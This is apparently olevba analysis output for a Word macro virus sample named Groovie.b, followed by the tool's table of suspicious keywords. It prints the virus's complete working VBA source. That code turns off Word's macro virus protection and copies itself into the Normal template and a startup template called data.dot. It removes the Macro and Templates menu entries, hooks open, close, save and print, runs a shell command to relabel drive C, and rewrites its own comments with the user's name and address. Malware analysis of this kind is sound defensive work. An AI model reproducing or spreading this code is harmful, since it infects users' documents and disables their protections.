olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-d374f4eaed6f6a1d483e19aac6117ca167f1f53f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-d374f4eaed6f6a1d483e19aac6117ca167f1f53f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-d374f4eaed6f6a1d483e19aac6117ca167f1f53f - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' RS17/02/00 17:52:30147Replication System147
Public I02 As Boolean
 ' RS17/02/00 17:52:30147Replication System147
Public I03 As Boolean
 ' RS17/02/00 17:52:30147Replication System147
Public I04 As Boolean
 ' RS17/02/00 17:52:30147Replication System147
Public I05 As Boolean
 ' RS17/02/00 17:52:30147Replication System147
Public I06 As String
 ' RS17/02/00 17:52:30147Replication System147
Public I07 As Boolean
 ' RS17/02/00 17:52:30147Replication System147
Public I08 As Boolean
 ' RS17/02/00 17:52:30147Replication System147
Function I09()
 ' RS17/02/00 17:52:30147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:30147Replication System147
    If MacroContainer = NormalTemplate Then
 ' RS17/02/00 17:52:30147Replication System147
        I01 = "normal"
 ' RS17/02/00 17:52:30147Replication System147
        GoTo checkout
 ' RS17/02/00 17:52:30147Replication System147
    End If
 ' RS17/02/00 17:52:30147Replication System147
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' RS17/02/00 17:52:30147Replication System147
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' RS17/02/00 17:52:30147Replication System147
checkout:
 ' RS17/02/00 17:52:30147Replication System147
End Function
 ' RS17/02/00 17:52:30147Replication System147
Function I10()
 ' RS17/02/00 17:52:30147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:30147Replication System147
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' RS17/02/00 17:52:30147Replication System147
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' RS17/02/00 17:52:30147Replication System147
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' RS17/02/00 17:52:30147Replication System147
    Next i
 ' RS17/02/00 17:52:30147Replication System147
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' RS17/02/00 17:52:30147Replication System147
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' RS17/02/00 17:52:30147Replication System147
    Next i
 ' RS17/02/00 17:52:30147Replication System147
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' RS17/02/00 17:52:30147Replication System147
End Function
 ' RS17/02/00 17:52:30147Replication System147
Function I11()
 ' RS17/02/00 17:52:30147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:30147Replication System147
Call I09
 ' RS17/02/00 17:52:30147Replication System147
Call I10
 ' RS17/02/00 17:52:30147Replication System147
    If I01 = "document" Then Call I12
 ' RS17/02/00 17:52:30147Replication System147
    If I01 = "normal" Then Call I13
 ' RS17/02/00 17:52:30147Replication System147
    If I01 = "orbit" Then Call I14
 ' RS17/02/00 17:52:30147Replication System147
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' RS17/02/00 17:52:30147Replication System147
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' RS17/02/00 17:52:30147Replication System147
End Function
 ' RS17/02/00 17:52:30147Replication System147
Function I12()
 ' RS17/02/00 17:52:30147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:30147Replication System147
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' RS17/02/00 17:52:30147Replication System147
    If I03 = False And I05 = False Then
 ' RS17/02/00 17:52:30147Replication System147
        With NormalTemplate.VBProject
 ' RS17/02/00 17:52:30147Replication System147
        With .VBComponents.Import("c:\groovie.sys")
 ' RS17/02/00 17:52:30147Replication System147
        End With
 ' RS17/02/00 17:52:30147Replication System147
        End With
 ' RS17/02/00 17:52:30147Replication System147
    End If
 ' RS17/02/00 17:52:30147Replication System147
    If I02 = False Then
 ' RS17/02/00 17:52:30147Replication System147
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' RS17/02/00 17:52:30147Replication System147
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' RS17/02/00 17:52:30147Replication System147
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' RS17/02/00 17:52:30147Replication System147
        If I08 = False Then Documents.Open FileName:=I06
 ' RS17/02/00 17:52:30147Replication System147
        Shell ("label c: groovie"), 0
 ' RS17/02/00 17:52:30147Replication System147
        Windows(1).Close
 ' RS17/02/00 17:52:30147Replication System147
    End If
 ' RS17/02/00 17:52:30147Replication System147
End Function
 ' RS17/02/00 17:52:30147Replication System147
Function I13()
 ' RS17/02/00 17:52:30147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:30147Replication System147
Application.ScreenUpdating = False
 ' RS17/02/00 17:52:30147Replication System147
    Call I17
 ' RS17/02/00 17:52:30147Replication System147
    If I04 = False And I07 = True Then
 ' RS17/02/00 17:52:30147Replication System147
        With ActiveDocument.VBProject
 ' RS17/02/00 17:52:30147Replication System147
        With .VBComponents.Import("c:\groovie.sys")
 ' RS17/02/00 17:52:30147Replication System147
        End With
 ' RS17/02/00 17:52:30147Replication System147
        End With
 ' RS17/02/00 17:52:30147Replication System147
        With Dialogs(wdDialogFileSummaryInfo)
 ' RS17/02/00 17:52:30147Replication System147
            .Comments = "ALT-F11 says it's groovie!"
 ' RS17/02/00 17:52:30147Replication System147
            .Execute
 ' RS17/02/00 17:52:30147Replication System147
        End With
 ' RS17/02/00 17:52:30147Replication System147
    End If
 ' RS17/02/00 17:52:30147Replication System147
    If I02 = False And I07 = True Then
 ' RS17/02/00 17:52:30147Replication System147
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' RS17/02/00 17:52:30147Replication System147
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' RS17/02/00 17:52:30147Replication System147
        If I08 = False Then Documents.Open FileName:=I06
 ' RS17/02/00 17:52:30147Replication System147
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' RS17/02/00 17:52:30147Replication System147
    End If
 ' RS17/02/00 17:52:30147Replication System147
    If I02 = False And I07 = False Then
 ' RS17/02/00 17:52:30147Replication System147
        Documents.Add Template:="", NewTemplate:=False
 ' RS17/02/00 17:52:30147Replication System147
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' RS17/02/00 17:52:30147Replication System147
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' RS17/02/00 17:52:30147Replication System147
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' RS17/02/00 17:52:30147Replication System147
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' RS17/02/00 17:52:30147Replication System147
    End If
 ' RS17/02/00 17:52:30147Replication System147
Application.ScreenUpdating = True
 ' RS17/02/00 17:52:30147Replication System147
End Function
 ' RS17/02/00 17:52:30147Replication System147
Function I14()
 ' RS17/02/00 17:52:30147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:30147Replication System147
Application.ScreenUpdating = False
 ' RS17/02/00 17:52:30147Replication System147
        If I03 = False And I05 = False Then
 ' RS17/02/00 17:52:31147Replication System147
            With NormalTemplate.VBProject
 ' RS17/02/00 17:52:31147Replication System147
            With .VBComponents.Import("c:\groovie.sys")
 ' RS17/02/00 17:52:31147Replication System147
            End With
 ' RS17/02/00 17:52:31147Replication System147
            End With
 ' RS17/02/00 17:52:31147Replication System147
            NormalTemplate.Save
 ' RS17/02/00 17:52:31147Replication System147
        End If
 ' RS17/02/00 17:52:31147Replication System147
        If I04 = False Then
 ' RS17/02/00 17:52:31147Replication System147
            With ActiveDocument.VBProject
 ' RS17/02/00 17:52:31147Replication System147
            With .VBComponents.Import("c:\groovie.sys")
 ' RS17/02/00 17:52:31147Replication System147
            End With
 ' RS17/02/00 17:52:31147Replication System147
            End With
 ' RS17/02/00 17:52:31147Replication System147
            With Dialogs(wdDialogFileSummaryInfo)
 ' RS17/02/00 17:52:31147Replication System147
                .Comments = "ALT-F11 says it's groovie!"
 ' RS17/02/00 17:52:31147Replication System147
                .Execute
 ' RS17/02/00 17:52:31147Replication System147
            End With
 ' RS17/02/00 17:52:31147Replication System147
        End If
 ' RS17/02/00 17:52:31147Replication System147
Application.ScreenUpdating = True
 ' RS17/02/00 17:52:31147Replication System147
End Function
 ' RS17/02/00 17:52:31147Replication System147
Function I15()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
    Options.VirusProtection = False
 ' RS17/02/00 17:52:31147Replication System147
    Options.SaveNormalPrompt = False
 ' RS17/02/00 17:52:31147Replication System147
    Options.ConfirmConversions = False
 ' RS17/02/00 17:52:31147Replication System147
    I06 = ActiveDocument.FullName
 ' RS17/02/00 17:52:31147Replication System147
    Call I11
 ' RS17/02/00 17:52:31147Replication System147
End Function
 ' RS17/02/00 17:52:31147Replication System147
Sub AutoOpen()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub AutoClose()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
I08 = True
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub AutoExit()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub FileSaveAs()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
Call I16
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
Dialogs(wdDialogFileSaveAs).Show
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub filesave()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
Call I16
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub fileclose()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
I08 = True
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' RS17/02/00 17:52:31147Replication System147
ActiveDocument.Close
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub fileprint()
 ' RS17/02/00 17:52:31147Replication System147
On Error Resume Next
 ' RS17/02/00 17:52:31147Replication System147
Call I15
 ' RS17/02/00 17:52:31147Replication System147
Dialogs(wdDialogFilePrint).Show
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub ViewVBCode()
 ' RS17/02/00 17:52:31147Replication System147
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Sub FileTemplates()
 ' RS17/02/00 17:52:31147Replication System147
End Sub
 ' RS17/02/00 17:52:31147Replication System147
Function I17()
 ' RS17/02/00 17:52:31147Replication System147
On Error GoTo docek
 ' RS17/02/00 17:52:31147Replication System147
    If ActiveDocument.Name <> "" Then
 ' RS17/02/00 17:52:31147Replication System147
        I07 = True
 ' RS17/02/00 17:52:31147Replication System147
    End If
 ' RS17/02/00 17:52:31147Replication System147
    GoTo over
 ' RS17/02/00 17:52:31147Replication System147
docek:
 ' RS17/02/00 17:52:31147Replication System147
    I07 = False
 ' RS17/02/00 17:52:31147Replication System147
over:
 ' RS17/02/00 17:52:31147Replication System147
End Function
 ' RS17/02/00 17:52:31147Replication System147
Function I16()
 ' RS17/02/00 17:52:31147Replication System147
Randomize
 ' RS17/02/00 17:52:31147Replication System147
rn = Int(Rnd * 999)
 ' RS17/02/00 17:52:31147Replication System147
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' RS17/02/00 17:52:31147Replication System147
For x = 2 To 358 Step 2
 ' RS17/02/00 17:52:31147Replication System147
.DeleteLines x
 ' RS17/02/00 17:52:31147Replication System147
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' RS17/02/00 17:52:31147Replication System147
Next x
 ' RS17/02/00 17:52:31147Replication System147
End With
 ' RS17/02/00 17:52:31147Replication System147
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

